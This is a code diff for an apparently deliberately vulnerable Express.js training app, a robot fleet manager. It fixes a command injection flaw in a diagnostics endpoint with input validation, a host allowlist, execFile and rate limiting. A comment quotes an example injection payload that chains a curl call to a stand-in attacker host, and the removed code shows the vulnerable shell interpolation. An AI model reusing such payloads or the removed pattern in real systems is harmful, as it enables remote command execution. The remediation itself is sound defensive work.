@@ -5,16 +5,16 @@ const session = require('express-session');
 const path = require('path');
 const fs = require('fs');
 const crypto = require('crypto');
-const { execSync } = require('child_process');
+const { execFile } = require('child_process');
 const bcrypt = require('bcrypt');
 const jwt = require('jsonwebtoken');
 const _ = require('lodash');
 const moment = require('moment');
 const axios = require('axios');
-const axios = require('axios');
 const helmet = require('helmet');
 const cors = require('cors');
 const serialize = require('serialize-javascript');
+const rateLimit = require('express-rate-limit');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -76,6 +76,57 @@ let robots = [
         assignedTask: 'Heavy Lifting'
     }
 ];
+
+const normalizeRobotName = (value) => {
+    if (typeof value !== 'string') {
+        return null;
+    }
+
+    const trimmed = value.trim();
+    if (!/^[a-z0-9-]+$/i.test(trimmed)) {
+        return null;
+    }
+
+    return trimmed.toLowerCase();
+};
+
+const ALLOWED_DIAGNOSTIC_TARGETS = robots.reduce((acc, robot) => {
+    const normalized = normalizeRobotName(robot.name);
+    if (normalized) {
+        acc[normalized] = `${normalized}.globomantics.local`;
+    }
+    return acc;
+}, {});
+
+const SAFE_DIAGNOSTIC_COMMANDS = ['ping', 'echo'];
+const resolveDiagnosticCommand = () => {
+    const candidate = process.env.DIAGNOSTIC_COMMAND;
+    if (candidate && SAFE_DIAGNOSTIC_COMMANDS.includes(candidate)) {
+        return candidate;
+    }
+    return 'ping';
+};
+
+const getDiagnosticArgs = (command, targetHost) => {
+    // Arguments are hard-coded per command to avoid exposing arbitrary flags.
+    switch (command) {
+    case 'ping':
+        return ['-c', '1', targetHost];
+    case 'echo':
+        return [targetHost];
+    default:
+        return [targetHost];
+    }
+};
+
+const diagnosticsRateLimiter = rateLimit({
+    windowMs: 60 * 1000,
+    limit: 10,
+    standardHeaders: true,
+    legacyHeaders: false,
+    keyGenerator: (req) => `${req.ip || 'global'}:${req.sessionID || 'anon'}`,
+    message: { error: 'Too many diagnostics requests. Please try again later.' }
+});
 
 let users = [
     {
@@ -168,14 +219,32 @@ app.get('/api/export/:format', (req, res) => {
 
 // --- Command Injection (CWE-78) ---
 // Semgrep: javascript.lang.security.audit.child-process-injection
-app.get('/api/diagnostics/:robotName', (req, res) => {
-    const robotName = req.params.robotName;
-    try {
-        const result = execSync(`ping -c 1 ${robotName}.globomantics.local`);
-        res.json({ output: result.toString() });
-    } catch (error) {
-        res.status(500).json({ error: 'Diagnostics failed' });
+// Attack vector: the robotName path parameter was previously interpolated into a shell
+// command (e.g., `ping -c 1 ${robotName}.globomantics.local}`) which allowed payloads
+// like `atlas-prime && curl attacker.tld/pwn` to run arbitrary commands.
+app.get('/api/diagnostics/:robotName', diagnosticsRateLimiter, (req, res) => {
+    const normalizedRobotName = normalizeRobotName(req.params.robotName);
+
+    if (!normalizedRobotName) {
+        return res.status(400).json({ error: 'Invalid robot name format. Use letters, numbers, and hyphens only.' });
     }
+
+    const targetHost = ALLOWED_DIAGNOSTIC_TARGETS[normalizedRobotName];
+    if (!targetHost) {
+        return res.status(400).json({ error: 'Unknown robot target' });
+    }
+
+    const diagnosticCommand = resolveDiagnosticCommand();
+    const diagnosticArgs = getDiagnosticArgs(diagnosticCommand, targetHost);
+
+    execFile(diagnosticCommand, diagnosticArgs, { timeout: 5000 }, (error, stdout) => {
+        if (error) {
+            console.error('Diagnostics command failed', error);
+            return res.status(502).json({ error: 'Diagnostics failed' });
+        }
+
+        res.json({ output: stdout.toString() });
+    });
 });
 
 // --- Path Traversal (CWE-22) ---
@@ -338,7 +407,18 @@ app.get('/api/telemetry/config', (req, res) => {
     });
 });
 
-app.listen(PORT, () => {
-    console.log(`🤖 Globomantics Robot Fleet Manager running on http://localhost:${PORT}`);
-    console.log('📊 Internal LOB Application - Authorized Personnel Only');
-});
+if (require.main === module) {
+    app.listen(PORT, () => {
+        console.log(`🤖 Globomantics Robot Fleet Manager running on http://localhost:${PORT}`);
+        console.log('📊 Internal LOB Application - Authorized Personnel Only');
+    });
+}
+
+module.exports = {
+    app,
+    normalizeRobotName,
+    ALLOWED_DIAGNOSTIC_TARGETS,
+    SAFE_DIAGNOSTIC_COMMANDS,
+    resolveDiagnosticCommand,
+    diagnosticsRateLimiter
+};
